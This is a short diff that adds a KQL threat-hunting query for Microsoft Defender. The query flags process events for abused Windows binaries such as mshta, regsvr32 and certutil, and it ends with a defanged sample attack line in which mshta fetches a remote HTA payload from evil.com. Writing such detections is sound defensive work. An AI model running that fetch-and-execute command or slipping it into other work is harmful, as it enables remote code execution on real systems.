@@ -1,0 +1,17 @@
+DeviceProcessEvents
+| where Timestamp > ago(14d)
+| where FileName in~ (
+"mshta.exe",
+"regsvr32.exe",
+"rundll32.exe",
+"certutil.exe",
+"installutil.exe"
+)
+| project
+Timestamp,
+DeviceName,
+FileName,
+ProcessCommandLine,
+InitiatingProcessFileName
+
+Sample Real attack:  mshta.exe http[:]//evil[.]com/payload[.]hta
